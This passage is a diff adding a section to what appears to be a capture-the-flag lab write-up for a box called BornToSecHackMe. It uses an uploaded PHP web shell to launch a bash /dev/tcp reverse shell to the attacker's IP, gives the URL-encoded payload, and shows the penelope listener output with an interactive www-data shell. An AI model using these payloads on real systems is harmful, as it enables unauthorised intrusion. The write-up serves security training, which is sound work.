@@ -134,3 +134,36 @@ We can now access the shell.php file with the following URL : `https://10.11.250
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Let's start a reverse shell with bash. We need to execute the following command in the server : `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` as `10.11.3.13` is our IP and `4444` is the port we will use to receive the shell. For it to pass it trough the php script, we need to use the `?c=` parameter and URL encode the command.
+
+We pass `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` to a website like `www.urlencoder.org` and we get the encoded command. Our payload will be `?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.
+
+We will be using `penelope` to have a fully functionnal and interactive reverse shell.
+
+```
+git clone https://github.com/brightio/penelope.git
+cd penelope
+chmod +x penelope.py
+```
+
+And we launch it with the following command : `python3 penelope.py -p 4444`. Then we access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.
+
+We have our shell :
+
+```
+nlederge@k0r3p13:work/penelope ‹main›$ python3 penelope.py 4444
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.11.3.13 • 172.17.0.1
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from BornToSecHackMe~10.11.250.230-Linux-i686 😍️ Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/nlederge/.penelope/sessions/BornToSecHackMe~10.11.250.230-Linux-i686/2025_10_15-17_24_57-715.log 📜
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
+www-data
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@BornToSecHackMe:/var/www/forum/templates_c$
+```
